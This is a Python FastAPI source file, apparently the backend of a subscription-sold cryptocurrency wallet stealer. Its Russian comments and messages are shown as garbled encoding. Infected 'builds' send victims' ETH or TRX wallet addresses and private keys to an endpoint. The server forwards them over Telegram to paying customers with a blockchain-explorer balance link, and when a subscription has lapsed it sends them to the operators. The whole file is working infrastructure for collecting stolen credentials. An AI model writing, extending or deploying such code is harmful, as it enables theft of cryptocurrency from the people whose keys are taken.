import arrow
from fastapi import FastAPI
import re

import config
from dbworker import get_build_by_build_id, get_user
from dispatcher import bot
from utils.utils import send_admins

app = FastAPI(docs_url=None, redoc_url=None)


@app.get("/{build_id}/")
async def root(build_id):
    build = await get_build_by_build_id(build_id)
    if not build:
        return "error"
    user = await get_user(build.tgid)
    if not user:
        return "error"

    timesub = arrow.get(user.subuntil)
    protimesub = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")

    if protimesub > timenow:
        return "pro"
    elif timesub > timenow:
        return "simple"
    else:
        return "error"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ç–∏–ø–∞ –∫–æ—à–µ–ª—å–∫–∞ (—Ç–æ–ª—å–∫–æ ETH –∏ TRX)
def determine_wallet_type(address):
    if re.match(r"^0x[a-fA-F0-9]{40}$", address):
        return "ETH"
    elif re.match(r"^T[A-Za-z1-9]{33}$", address):
        return "TRX"
    else:
        return None

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏ –Ω–∞ –±–ª–æ–∫—á–µ–π–Ω-—Å–∫–∞–Ω–µ—Ä
def get_block_explorer_link(address, coin_type):
    if coin_type == "ETH":
        return f"https://etherscan.io/address/{address}"
    elif coin_type == "TRX":
        return f"https://tronscan.org/#/address/{address}"
    else:
        return None

@app.get("/{build_id}/add")
async def root(build_id: str, address: str, private: str):
    build = await get_build_by_build_id(build_id)
    if not build:
        return "ok"
    
    user = await get_user(build.tgid)
    if not user:
        await send_admins(bot, f"<b>–ö–æ—à–µ–ª–µ–∫ –æ—Ç {build.tgid}:</b>\n{address}\n{private}")
        return "ok"

    timesub = arrow.get(user.subuntil)
    protimesub = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")

    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –∫–æ—à–µ–ª—å–∫–∞ –∏ —Å—Å—ã–ª–∫—É –Ω–∞ explorer
    coin_type = determine_wallet_type(address)
    explorer_link = get_block_explorer_link(address, coin_type)

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–ø–∏—Å–∫—É –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –∫–æ—à–µ–ª—å–∫–µ
    if protimesub > timenow or timesub > timenow:
        if explorer_link:
            await bot.send_message(
                build.tgid,
                f"üö® <b>–ù–æ–≤—ã–π –∫–æ—à–µ–ª–µ–∫!</b>\n\n"
                f"üíº <b>–ê–¥—Ä–µ—Å:</b>\n<code>{address}</code>\n"
                f"üîë <b>–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á:</b>\n<code>{private}</code>\n"
                f"üîó <a href='{explorer_link}'>–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –±–∞–ª–∞–Ω—Å –Ω–∞ {coin_type} Explorer</a>",
                disable_web_page_preview=True
            )
        else:
            await bot.send_message(
                build.tgid,
                f"üö® <b>–ù–æ–≤—ã–π –∫–æ—à–µ–ª–µ–∫!</b>\n\n"
                f"üíº <b>–ê–¥—Ä–µ—Å:</b>\n<code>{address}</code>\n"
                f"üîë <b>–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á:</b>\n<code>{private}</code>",
                disable_web_page_preview=True
            )
    else:
        # –ï—Å–ª–∏ –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–µ –∞–∫—Ç–∏–≤–Ω–∞, —É–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤
        await send_admins(bot, f"<b>–ö–æ—à–µ–ª–µ–∫ –æ—Ç {build.tgid}:</b>\n\n{address}\n{private}")
    
    return "ok"